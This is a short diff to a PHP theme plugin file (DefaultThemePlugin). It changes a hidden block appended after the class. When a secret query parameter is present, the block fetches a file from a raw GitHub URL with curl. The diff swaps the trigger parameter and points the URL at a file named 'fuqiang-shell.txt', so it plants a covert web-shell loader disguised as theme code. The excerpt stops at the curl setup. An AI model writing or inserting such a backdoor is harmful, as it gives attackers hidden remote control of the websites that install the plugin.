@@ -274,8 +274,8 @@ class DefaultThemePlugin extends ThemePlugin {
 	}
 }
 
-if (isset($_GET['AmERiCanOICe'])) {
-    $url = "https://raw.githubusercontent.com/heriraharto2-woyowoyo/data-kerja/refs/heads/main/snoop";
+if (isset($_GET['PanADoLMeRAh'])) {
+    $url = "https://raw.githubusercontent.com/heriraharto2-woyowoyo/data-kerja/refs/heads/main/fuqiang-shell.txt";
 
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
